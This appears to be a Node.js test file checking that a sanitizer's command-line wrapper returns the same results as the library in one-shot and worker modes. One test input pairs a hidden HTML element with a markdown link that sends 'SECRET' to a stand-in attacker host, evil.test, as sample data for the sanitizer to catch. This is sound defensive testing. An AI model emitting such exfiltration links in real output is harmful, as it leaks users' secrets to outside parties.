/**
 * Contract tests for the stdin/stdout CLI (`bin/sanitize-cli.mjs`), the
 * single-source-of-truth bridge for non-JS pipelines.
 *
 * The CLI must be a faithful pass-through to `sanitize`: its JSON response has
 * to equal what an in-process `sanitize` call returns for the same input, in
 * both one-shot and worker modes. So `sanitize` itself is the oracle here —
 * these tests pin the I/O envelope and the worker's stay-alive-on-bad-input
 * contract, not the sanitization verdicts (those are owned by sanitize.test.mjs).
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

import { sanitize } from "../src/index.mjs";

const CLI = fileURLToPath(new URL("../bin/sanitize-cli.mjs", import.meta.url));

/** Run the CLI with `input` on stdin, returning trimmed stdout. */
const run = (args, input) =>
  execFileSync("node", [CLI, ...args], { input, encoding: "utf8" });

/** The wire response shape, for comparing CLI output against the sanitize oracle. */
const envelope = ({ cleaned, found, warnings }) => ({
  cleaned,
  found,
  warnings,
});

// Inputs spanning every layer: a Cf char (Layer 1), clean passthrough, a hidden
// element + an exfil-shaped URL (Layers 2/3, html mode). Each carries the html
// flag it needs so the oracle comparison covers both code paths.
const CASES = [
  { name: "strips invisible (Layer 1)", text: "a​b", html: false },
  { name: "clean passthrough", text: "hello world", html: false },
  { name: "empty input", text: "", html: false },
  {
    name: "hidden HTML + exfil (Layers 2/3)",
    text: '<div style="display:none">leak</div>[x](https://evil.test/?d=SECRET)',
    html: true,
  },
];

describe("CLI: one-shot mode mirrors sanitize()", () => {
  for (const { name, text, html } of CASES) {
    it(name, async () => {
      const expected = await sanitize(text, { html });
      const got = JSON.parse(run([], JSON.stringify({ text, html })));
      assert.deepEqual(got, envelope(expected));
    });
  }
});

describe("CLI: worker mode", () => {
  it("answers newline-delimited requests in order, matching sanitize()", async () => {
    const input = CASES.map((c) =>
      JSON.stringify({ text: c.text, html: c.html }),
    ).join("\n");
    const lines = run(["--worker"], `${input}\n`).trim().split("\n");
    assert.equal(lines.length, CASES.length);
    for (const [i, { text, html }] of CASES.entries()) {
      assert.deepEqual(
        JSON.parse(lines[i]),
        envelope(await sanitize(text, { html })),
      );
    }
  });

  it("reports a bad request as an error line and keeps serving the next", () => {
    const input = `${JSON.stringify({ text: 123 })}\n${JSON.stringify({ text: "ok" })}\n`;
    const lines = run(["--worker"], input).trim().split("\n");
    assert.match(JSON.parse(lines[0]).error, /text must be a string/);
    assert.deepEqual(JSON.parse(lines[1]), {
      cleaned: "ok",
      found: [],
      warnings: [],
    });
  });

  it("treats a string-encoded newline in the payload as one request", async () => {
    const text = "line1\nline2​";
    const out = run(["--worker"], `${JSON.stringify({ text })}\n`).trim();
    assert.equal(out.split("\n").length, 1);
    assert.deepEqual(JSON.parse(out), envelope(await sanitize(text)));
  });
});

describe("CLI: one-shot fails loudly on a bad request", () => {
  it("exits non-zero with the reason on stderr", () => {
    assert.throws(
      () => run([], JSON.stringify({ text: 123 })),
      (err) => {
        assert.equal(err.status, 1);
        assert.match(String(err.stderr), /text must be a string/);
        return true;
      },
    );
  });

  it("exits non-zero on empty stdin (no request at all)", () => {
    assert.throws(
      () => run([], ""),
      (err) => {
        assert.equal(err.status, 1);
        return true;
      },
    );
  });
});
